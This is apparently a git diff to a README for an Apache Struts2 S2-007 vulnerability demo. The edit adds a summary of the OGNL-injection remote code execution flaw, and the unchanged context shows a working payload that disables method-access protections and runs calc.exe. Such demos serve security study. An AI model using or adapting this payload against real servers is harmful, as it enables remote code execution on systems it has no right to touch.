@@ -1,11 +1,20 @@
 # S2-007 Demo
 
+## Summary
+
+Impact of vulnerability: Remote Code Execution
+
+Affected Software: `Struts 2.0.0` - `Struts 2.2.3`
+
+Problem: User input is evaluated as an `OGNL` expression when there's a conversion error. This allows a malicious user to execute arbitrary code. 
+
 ## Environment
-Struts2: struts-2.2.3
 
-Tomcat: 8.5.53
+Struts2: `struts-2.2.3`
 
-IDE: idea 2020.1.1 ULTIMATE
+Server: `Tomcat 8.5.53`
+
+IDE: `idea 2020.1.1 ULTIMATE`
 
 ## POC
 
@@ -15,7 +24,7 @@ IDE: idea 2020.1.1 ULTIMATE
 
 ## Payload
 
-- open calc.exe
+- open `calc.exe`
 
   ```java
   ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("calc")) + '
@@ -34,3 +43,4 @@ IDE: idea 2020.1.1 ULTIMATE
 
 * [【Struts2-命令-代码执行漏洞分析系列】S2-007](https://xz.aliyun.com/t/2684)
 
+* [S2-007](https://cwiki.apache.org/confluence/display/WW/S2-007)
